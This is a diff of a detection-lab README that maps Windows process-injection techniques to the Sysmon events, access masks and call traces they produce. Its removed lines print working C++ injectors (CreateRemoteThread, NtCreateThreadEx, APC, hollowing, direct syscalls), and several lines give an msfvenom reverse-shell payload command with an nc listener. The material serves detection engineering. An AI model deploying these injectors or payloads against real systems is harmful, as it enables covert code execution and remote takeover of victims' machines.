@@ -32,12 +32,12 @@ at the lowest possible level below any userland bypass.
 | T2  NtCreateThreadEx       | 0x1fffff (0x143a possible)       | Same Win32 promotion as T1                           |
 | T3  APC Early Bird         | 0x1fffff (0x143a possible)       | CreateProcess child handle grants full access        |
 | T4  Process Hollowing      | 0x1fffff (0x143a possible)       | CreateProcess child handle grants full access        |
-| T5  Direct Syscall         | 0x142a         | Kernel enforces exact rights — no Win32 promotion    |
+| T5  Direct Syscall         | 0x142a         | Kernel enforces exact rights - no Win32 promotion    |
 | T6  DLL Injection          | 0x102a         | Kernel substitutes QUERY_INFO for QUERY_LIMITED      |
-| T7  Reflective DLL (recon) | 0x1410         | Metasploit recon handle — VM_READ+QUERY_LTD only     |
-| T7  Reflective DLL (inject)| 0x3fff         | Metasploit injection handle — near full access       |
-| T8  Thread Hijacking       | 0x1428         | CREATE_THREAD (0x0002) absent — no thread created    |
-| T9  NtCreateSection        | 0x140a         | VM_WRITE (0x0020) absent — section mapping used      |
+| T7  Reflective DLL (recon) | 0x1410         | Metasploit recon handle - VM_READ+QUERY_LTD only     |
+| T7  Reflective DLL (inject)| 0x3fff         | Metasploit injection handle - near full access       |
+| T8  Thread Hijacking       | 0x1428         | CREATE_THREAD (0x0002) absent - no thread created    |
+| T9  NtCreateSection        | 0x140a         | VM_WRITE (0x0020) absent - section mapping used      |
 | T10 Module Stomping        | 0x143a         | Standard minimal injection rights                    |
 | T11 Doppelganging          | -              | Failed lab attempt                                   |
 | T12 SetWindowsHookEx       | -              | No OpenProcess,  Windows dispatcher injects          |
@@ -91,7 +91,7 @@ Process created or image modified
 
 <img width="942" height="712" alt="image" src="https://github.com/user-attachments/assets/65977293-a5d1-43cc-8dab-a8c0f33aa17d" />
 
-## Process Access Rights
+## Process Access Rights Overview
 
 | Value    | Breakdown                                                | Technique / Context                         |
 |----------|----------------------------------------------------------|---------------------------------------------|
@@ -134,7 +134,7 @@ Process created or image modified
 | High     | 0x143A;0x147A;0x102A;0x1C28         | Classic injection combos             |
 | Medium   | 0x1410;0x1028;0x1038;0x103A;0x1438  | Memory ops without full access       |
 | Medium   | 0x0040;0x0800;0x0478                | Handle dup and suspend paths         |
-| Low      | 0x0010;0x0400;0x1000;0x0020         | Read/query alone — recon     
+| Low      | 0x0010;0x0400;0x1000;0x0020         | Read/query alone for recon           |
 
 ## Sysmon CallTrace explained
 CallTrace reads right to left with the rightmost entry is where execution started. UNKNOWN in calltrace means the code at that address has no associated PE module with raw code executing from VirtualAllocEx allocated memory and most often shellcode. All executables compiled with MinGW which show some KERNEL32 CRT noise in init for example: ntdll.dll+162164 (thread startup) -> KERNELBASE.dll+360c6 (mingw boilerplate) -> payload.exe+160b (main() function).
@@ -189,14 +189,14 @@ SeDebugPrivilege which allows a process to open handles to any process regardles
 
 
 ## Lab setup
-1. Windows Host running ELK in WSL with local FW rules to push traffic to through host to WSL
-2. Windows 11 in VirtualBox with Elastic Agent, Sysmon and sysmonconfig-olaf-filedelete.xml on bridged network
+1. Installed Elastic with https://github.com/peasead/elastic-container
+1. Windows 11 Host running ELK in WSL with local FW rules to push traffic through host to WSL
+2. Windows 11 in VirtualBox with Elastic Agent, Sysmon v15.2 and sysmonconfig-olaf-filedelete.xml on bridged network
 4. Kali VM as attacking machine on bridged network
-
 
 ### Initialize common.h header with shellcode
 On Kali run:
-- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.32.49 LPORT=4444 -f c -b \x00\x0a\x0d
+- msfvenom -p windows/x64/shell_reverse_tcp LHOST=\<LOCAL IP\> LPORT=4444 -f c -b \x00\x0a\x0d
 - nc -lvnp 4444
 
 Then common header used for several of the techniques
@@ -267,80 +267,13 @@ DWORD GetPID(const wchar_t* procName) {
 ```
 
 ## T1. Classic CreateRemoteThread
-Opens a handle to a running process, writes shellcode into its memory space,
-then creates a new thread inside that process to execute it. All through
-documented Win32 API calls in kernel32.dll. Most well-known injection
-technique.
-
-The four API calls and what Sysmon sees at each step:
+Opens a handle to a running process, writes shellcode into its memory space, then creates a new thread inside that process to execute it. All through documented Win32 API calls in kernel32.dll.  The four API calls and what Sysmon sees at each step:
 | API Call               | Layer   | Sysmon Event |
 |------------------------|---------|--------------|
 | OpenProcess()          | Win32   | EID 10       |
 | VirtualAllocEx()       | Win32   | -            |
 | WriteProcessMemory()   | Win32   | -            |
 | CreateRemoteThread()   | Win32   | EID 8        |
-
-```
-// t1_classic_crt_minimal.cpp
-#include "common.h"
-
-int main() {
-    DWORD pid = GetPID(L"notepad.exe");
-    if (!pid) {
-        wprintf(L"[-] notepad.exe not found\n");
-        return 1;
-    }
-    wprintf(L"[*] Target PID: %lu\n", pid);
-
-    // Minimum rights for CRT injection
-    HANDLE hProc = OpenProcess(
-        PROCESS_VM_WRITE          |   // WriteProcessMemory
-        PROCESS_VM_OPERATION      |   // VirtualAllocEx
-        PROCESS_CREATE_THREAD     |   // CreateRemoteThread
-        PROCESS_QUERY_INFORMATION,    // GetExitCodeThread
-        FALSE, pid
-    );
-    if (!hProc) {
-        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
-        return 1;
-    }
-    wprintf(L"[+] Handle acquired — requested 0x143a\n");
-
-    LPVOID remoteMem = VirtualAllocEx(
-        hProc, NULL, shellcode_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
-    if (!remoteMem) {
-        wprintf(L"[-] VirtualAllocEx failed\n");
-        return 1;
-    }
-    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);
-
-    SIZE_T written = 0;
-    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
-        wprintf(L"[-] WriteProcessMemory failed\n");
-        return 1;
-    }
-    wprintf(L"[+] Shellcode written: %zu bytes\n", written);
-
-    HANDLE hThread = CreateRemoteThread(
-        hProc, NULL, 0,
-        (LPTHREAD_START_ROUTINE)remoteMem,
-        NULL, 0, NULL
-    );
-    if (!hThread) {
-        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
-        return 1;
-    }
-    wprintf(L"[+] Remote thread created\n");
-
-    WaitForSingleObject(hThread, 5000);
-    CloseHandle(hThread);
-    CloseHandle(hProc);
-    return 0;
-}
-```
 
 ### Sysmon Data
 1. "Process accessed:
@@ -434,7 +367,7 @@ DestinationHostname: -
 DestinationPort: 4444
 DestinationPortName: -"
 
-### SYSMON analysis
+### Sysmon analysis
 Had to add in ProcessAcess onmatch=include with GrantedAccess value 0x1FFFFF to catch event 1. Added ProcessInjectionDelux to cover all types of binary codes (  0x1FFFFF;0x1F0FFF;0x1F1FFF;0x1F2FFF;0x1F3FFF;0x143A;0x147A;0x047A;0x1410;0x1438;0x0478;0x1010;0x1410). Also csrss.exe opens handles to every process that starts or exits on the system so could need to exclude for less noise.
 
 | Step | Action                                | Sysmon EID | Rule Triggered          |
@@ -463,103 +396,6 @@ Calls NtCreateThreadEx directly from ntdll.dll instead of going through CreateRe
 | VirtualAllocEx()    | Win32      | -            |
 | WriteProcessMemory()| Win32      | -            |
 | NtCreateThreadEx()  | Native API | EID 8        |
-
-```
-// t2_ntcreatethreadex.cpp
-#include "common.h"
-
-typedef NTSTATUS(WINAPI* pNtCreateThreadEx)(
-    PHANDLE             hThread,
-    ACCESS_MASK         DesiredAccess,
-    LPVOID              ObjectAttributes,
-    HANDLE              ProcessHandle,
-    LPTHREAD_START_ROUTINE lpStartAddress,
-    LPVOID              lpParameter,
-    ULONG               Flags,
-    SIZE_T              StackZeroBits,
-    SIZE_T              SizeOfStackCommit,
-    SIZE_T              SizeOfStackReserve,
-    LPVOID              lpBytesBuffer
-);
-
-int main() {
-    DWORD pid = GetPID(L"notepad.exe");
-    if (!pid) {
-        wprintf(L"[-] notepad.exe not found\n");
-        return 1;
-    }
-    wprintf(L"[*] Target PID: %lu\n", pid);
-
-    // Minimum rights for NtCreateThreadEx injection
-    HANDLE hProc = OpenProcess(
-        PROCESS_VM_WRITE          |   // WriteProcessMemory
-        PROCESS_VM_OPERATION      |   // VirtualAllocEx
-        PROCESS_CREATE_THREAD     |   // NtCreateThreadEx
-        PROCESS_QUERY_INFORMATION,    // NtQueryInformationProcess
-        FALSE, pid
-    );
-    if (!hProc) {
-        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
-        return 1;
-    }
-    wprintf(L"[+] Handle acquired — requested 0x143a\n");
-
-    LPVOID remoteMem = VirtualAllocEx(
-        hProc, NULL, shellcode_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
-    if (!remoteMem) {
-        wprintf(L"[-] VirtualAllocEx failed\n");
-        return 1;
-    }
-    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);
-
-    SIZE_T written = 0;
-    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
-        wprintf(L"[-] WriteProcessMemory failed\n");
-        return 1;
-    }
-    wprintf(L"[+] Shellcode written: %zu bytes\n", written);
-
-    // Resolve NtCreateThreadEx directly from ntdll
-    // bypassing kernel32.dll entirely
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
-        ntdll, "NtCreateThreadEx"
-    );
-    if (!NtCreateThreadEx) {
-        wprintf(L"[-] Failed to resolve NtCreateThreadEx\n");
-        return 1;
-    }
-    wprintf(L"[+] NtCreateThreadEx resolved at: 0x%p\n", NtCreateThreadEx);
-
-    HANDLE hThread = NULL;
-    NTSTATUS status = NtCreateThreadEx(
-        &hThread,
-        GENERIC_EXECUTE,
-        NULL,
-        hProc,
-        (LPTHREAD_START_ROUTINE)remoteMem,
-        NULL,
-        0,
-        0, 0, 0,
-        NULL
-    );
-
-    wprintf(L"[+] NtCreateThreadEx status: 0x%08X\n", status);
-    if (!hThread) {
-        wprintf(L"[-] Thread creation failed\n");
-        return 1;
-    }
-    wprintf(L"[+] Remote thread created — requested 0x143a\n");
-
-    WaitForSingleObject(hThread, 5000);
-    CloseHandle(hThread);
-    CloseHandle(hProc);
-    return 0;
-}
-```
 
 ### Sysmon Data
 1. "Process accessed:
@@ -684,56 +520,6 @@ Threads can execute code asynchronously by leveraging APC queues. It queues a fu
 | OpenThread()        | Win32      | -            |
 | QueueUserAPC()      | Win32      | -            |
 
-```
-// t3_apc_injection.cpp
-#include "common.h"
-
-int main() {
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi = {};
-
-    // Create suspended — thread alertable during init
-    if (!CreateProcessW(
-        L"C:\\Windows\\System32\\notepad.exe",
-        NULL, NULL, NULL, FALSE,
-        CREATE_SUSPENDED,
-        NULL, NULL, &si, &pi)) {
-        wprintf(L"[-] CreateProcess failed: %lu\n", GetLastError());
-        return 1;
-    }
-    wprintf(L"[*] Created suspended PID: %lu TID: %lu\n",
-            pi.dwProcessId, pi.dwThreadId);
-
-    // Allocate and write shellcode
-    LPVOID remoteMem = VirtualAllocEx(
-        pi.hProcess, NULL, shellcode_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
-    SIZE_T written = 0;
-    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcode_size, &written);
-    wprintf(L"[+] Shellcode written: %zu bytes at 0x%p\n", written, remoteMem);
-
-    // Queue APC to the main thread before it runs
-    // Thread is alertable during early initialization
-    DWORD result = QueueUserAPC(
-        (PAPCFUNC)remoteMem,
-        pi.hThread,
-        NULL
-    );
-    wprintf(L"[+] APC queued: %lu\n", result);
-
-    // Resume — thread executes APC before anything else
-    ResumeThread(pi.hThread);
-    wprintf(L"[*] Thread resumed — APC executes during init\n");
-
-    WaitForSingleObject(pi.hProcess, 5000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    return 0;
-}
-```
-
 ### Sysmon Data
 1."Process accessed:
 RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
@@ -844,122 +630,6 @@ Process hollowing creates a legitimate process suspended, unmaps its original im
 | SetThreadContext()       | Win32      | -            |
 | ResumeThread()           | Win32      | -            |
 
-```
-// t4_process_hollowing.cpp
-#include "common.h"
-#include <winternl.h>
-
-typedef NTSTATUS(WINAPI* NtUnmapViewOfSection)(HANDLE, PVOID);
-typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
-    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
-
-int main() {
-    wprintf(L"[*] Starting process hollowing x64...\n");
-
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi = {};
-
-    if (!CreateProcessW(
-        L"C:\\Windows\\System32\\notepad.exe",
-        NULL, NULL, NULL, FALSE,
-        CREATE_SUSPENDED,
-        NULL, NULL, &si, &pi)) {
-        wprintf(L"[-] CreateProcess failed: %lu\n", GetLastError());
-        return 1;
-    }
-    wprintf(L"[+] Suspended PID: %lu TID: %lu\n",
-            pi.dwProcessId, pi.dwThreadId);
-
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-
-    auto NtQIP = (pNtQueryInformationProcess)GetProcAddress(
-        ntdll, "NtQueryInformationProcess");
-
-    PROCESS_BASIC_INFORMATION pbi = {};
-    ULONG retLen = 0;
-    NtQIP(pi.hProcess, ProcessBasicInformation,
-          &pbi, sizeof(pbi), &retLen);
-    wprintf(L"[+] PEB at: 0x%p\n", pbi.PebBaseAddress);
-
-    // x64 PEB offset 0x10 = ImageBaseAddress
-    PVOID imageBase = NULL;
-    SIZE_T bytesRead = 0;
-    ReadProcessMemory(pi.hProcess,
-        (PBYTE)pbi.PebBaseAddress + 0x10,
-        &imageBase, sizeof(PVOID), &bytesRead);
-    wprintf(L"[+] Remote image base: 0x%p\n", imageBase);
-
-    // Unmap original image — EID 25 fires here
-    auto myNtUnmap = (NtUnmapViewOfSection)GetProcAddress(
-        ntdll, "NtUnmapViewOfSection");
-    NTSTATUS st = myNtUnmap(pi.hProcess, imageBase);
-    wprintf(L"[+] NtUnmapViewOfSection: 0x%08X\n", st);
-
-    // Allocate at original base
-    LPVOID newMem = VirtualAllocEx(
-        pi.hProcess, imageBase,
-        shellcode_size + 0x2000,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
-    if (!newMem) {
-        wprintf(L"[!] Original base failed, using NULL\n");
-        newMem = VirtualAllocEx(
-            pi.hProcess, NULL,
-            shellcode_size + 0x2000,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
-        );
-    }
-    wprintf(L"[+] Allocated at: 0x%p\n", newMem);
-
-    // Shellcode at +0x1000 for alignment
-    LPVOID shellcodeAddr = (PVOID)((ULONG_PTR)newMem + 0x1000);
-
-    SIZE_T written = 0;
-    WriteProcessMemory(pi.hProcess, shellcodeAddr,
-                       shellcode, shellcode_size, &written);
-    wprintf(L"[+] Shellcode written: %zu bytes at 0x%p\n",
-            written, shellcodeAddr);
-
-    // Update PEB ImageBaseAddress
-    WriteProcessMemory(pi.hProcess,
-        (PBYTE)pbi.PebBaseAddress + 0x10,
-        &newMem, sizeof(PVOID), NULL);
-    wprintf(L"[+] PEB ImageBase updated\n");
-
-    // Verify bytes
-    unsigned char verify[8] = {};
-    ReadProcessMemory(pi.hProcess, shellcodeAddr, verify, 8, NULL);
-    wprintf(L"[+] First bytes at Rip: ");
-    for (int i = 0; i < 8; i++) wprintf(L"%02X ", verify[i]);
-    wprintf(L"\n");
-
-    // Get full thread context
-    CONTEXT ctx = {};
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(pi.hThread, &ctx);
-    wprintf(L"[+] Original Rip: 0x%llx\n", ctx.Rip);
-    wprintf(L"[+] Original Rsp: 0x%llx\n", ctx.Rsp);
-
-    // x64 — Rip is instruction pointer
-    ctx.Rip = (DWORD64)shellcodeAddr;
-
-    // Align stack + shadow space
-    ctx.Rsp = (ctx.Rsp & ~0xF) - 0x28;
-
-    SetThreadContext(pi.hThread, &ctx);
-    wprintf(L"[+] Rip set to: 0x%p\n", shellcodeAddr);
-
-    ResumeThread(pi.hThread);
-    wprintf(L"[*] Resumed — watch for EID 25\n");
-
-    WaitForSingleObject(pi.hProcess, 10000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    return 0;
-}
-```
 ### Sysmon Data
 1. "Process accessed:
 RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
@@ -1018,160 +688,6 @@ Direct syscalls bypasses ntdll.dll entirely by executing the syscall instruction
 | NtWriteVirtualMemory     | 0x003A |
 | NtCreateThreadEx         | 0x00C9 |
 | NtProtectVirtualMemory   | 0x0050 |
-
-```
-// t5_direct_syscall.cpp
-#include "common.h"
-
-// NT types needed for syscall signatures
-typedef struct _OBJECT_ATTRIBUTES {
-    ULONG Length;
-    HANDLE RootDirectory;
-    PVOID ObjectName;
-    ULONG Attributes;
-    PVOID SecurityDescriptor;
-    PVOID SecurityQualityOfService;
-} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
-
-typedef struct _CLIENT_ID {
-    HANDLE UniqueProcess;
-    HANDLE UniqueThread;
-} CLIENT_ID, *PCLIENT_ID;
-
-// Syscall stubs declared in syscalls.asm
-extern "C" {
-    NTSTATUS SysNtOpenProcess(
-        PHANDLE ProcessHandle,
-        ACCESS_MASK DesiredAccess,
-        POBJECT_ATTRIBUTES ObjectAttributes,
-        PCLIENT_ID ClientId
-    );
-    NTSTATUS SysNtAllocateVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID* BaseAddress,
-        ULONG_PTR ZeroBits,
-        PSIZE_T RegionSize,
-        ULONG AllocationType,
-        ULONG Protect
-    );
-    NTSTATUS SysNtWriteVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID BaseAddress,
-        PVOID Buffer,
-        SIZE_T NumberOfBytesToWrite,
-        PSIZE_T NumberOfBytesWritten
-    );
-    NTSTATUS SysNtCreateThreadEx(
-        PHANDLE ThreadHandle,
-        ACCESS_MASK DesiredAccess,
-        PVOID ObjectAttributes,
-        HANDLE ProcessHandle,
-        PVOID StartRoutine,
-        PVOID Argument,
-        ULONG CreateFlags,
-        SIZE_T ZeroBits,
-        SIZE_T StackSize,
-        SIZE_T MaximumStackSize,
-        PVOID AttributeList
-    );
-}
-
-int main() {
-    DWORD pid = GetPID(L"notepad.exe");
-    if (!pid) {
-        wprintf(L"[-] notepad.exe not found\n");
-        return 1;
-    }
-    wprintf(L"[*] Target PID: %lu\n", pid);
-
-    // Build required structures for NtOpenProcess
-    OBJECT_ATTRIBUTES oa = {};
-    oa.Length = sizeof(OBJECT_ATTRIBUTES);
-
-    CLIENT_ID cid = {};
-    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
-    cid.UniqueThread  = NULL;
-
-    // EID 10 fires here — kernel records handle open
-    // ntdll hook bypassed — Sysmon still catches it
-    HANDLE hProc = NULL;
-    NTSTATUS st = SysNtOpenProcess(
-        &hProc,
-        PROCESS_VM_WRITE         |
-        PROCESS_VM_OPERATION     |
-        PROCESS_CREATE_THREAD    |
-        PROCESS_QUERY_INFORMATION,
-        &oa,
-        &cid
-    );
-    wprintf(L"[+] SysNtOpenProcess: 0x%08X handle: 0x%p\n", st, hProc);
-    if (!hProc) {
-        wprintf(L"[-] Failed to open process\n");
-        return 1;
-    }
-
-    // Allocate RWX memory in remote process
-    PVOID remoteMem = NULL;
-    SIZE_T allocSize = shellcode_size;
-    st = SysNtAllocateVirtualMemory(
-        hProc,
-        &remoteMem,
-        0,
-        &allocSize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
-    wprintf(L"[+] SysNtAllocateVirtualMemory: 0x%08X at 0x%p\n", st, remoteMem);
-    if (st != 0) {
-        wprintf(L"[-] Allocation failed\n");
-        return 1;
-    }
-
-    // Write shellcode
-    SIZE_T written = 0;
-    st = SysNtWriteVirtualMemory(
-        hProc,
-        remoteMem,
-        shellcode,
-        shellcode_size,
-        &written
-    );
-    wprintf(L"[+] SysNtWriteVirtualMemory: 0x%08X wrote %zu bytes\n", st, written);
-    if (st != 0) {
-        wprintf(L"[-] Write failed\n");
-        return 1;
-    }
-
-    // EID 8 fires here — kernel thread creation event identical to T1/T2
-    // ntdll hook bypassed — Sysmon still catches it
-    HANDLE hThread = NULL;
-    st = SysNtCreateThreadEx(
-        &hThread,
-        GENERIC_EXECUTE,
-        NULL,
-        hProc,
-        remoteMem,
-        NULL,
-        0,
-        0, 0, 0,
-        NULL
-    );
-    wprintf(L"[+] SysNtCreateThreadEx: 0x%08X\n", st);
-    if (!hThread) {
-        wprintf(L"[-] Thread creation failed\n");
-        return 1;
-    }
-    wprintf(L"[+] Remote thread created\n");
-    wprintf(L"[*] ntdll hooks bypassed — Sysmon should still catch EID 8 and 10\n");
-    wprintf(L"[*] Direct syscalls evade EDR userland hooks not kernel monitoring\n");
-
-    WaitForSingleObject(hThread, 5000);
-    CloseHandle(hThread);
-    CloseHandle(hProc);
-    return 0;
-}
-```
-
 
 ### Sysmon Data
 1. "Process accessed:
@@ -1294,12 +810,7 @@ ntdll and the injector binary because OpenProcess routes through it. In T5 the s
 
 
 ## T6. DLL Injection
-Loads a malicious DLL into a target process by writing the DLL path
-into remote memory and creating a thread that calls LoadLibraryA with
-that path as its argument. Key difference from T1-T5 instead of
-writing raw shellcode, a legitimate Windows API function is used as
-the thread entry point. This changes the EID 8 StartModule from
-anonymous memory to kernel32.dll.
+Loads a malicious DLL into a target process by writing the DLL path into remote memory and creating a thread that calls LoadLibraryA with that path as its argument. Key difference from T1-T5 instead of writing raw shellcode, a legitimate Windows API function is used as the thread entry point. This changes the EID 8 StartModule from anonymous memory to kernel32.dll.
 | API Call              | Layer | Sysmon Event              |
 |-----------------------|-------|---------------------------|
 | OpenProcess()         | Win32 | EID 10                    |
@@ -1487,7 +998,7 @@ Loads a DLL into a target process without using LoadLibraryA. Instead the DLL co
 
 <img width="1840" height="1162" alt="image" src="https://github.com/user-attachments/assets/52af37b7-98ff-4592-90bb-041d70e78c51" />
 
-### Sysmon Data for Metasploit session
+### Sysmon Data (Metasploit session)
 1. "Process accessed:
 RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
 UtcTime: 2026-05-15 14:21:28.893
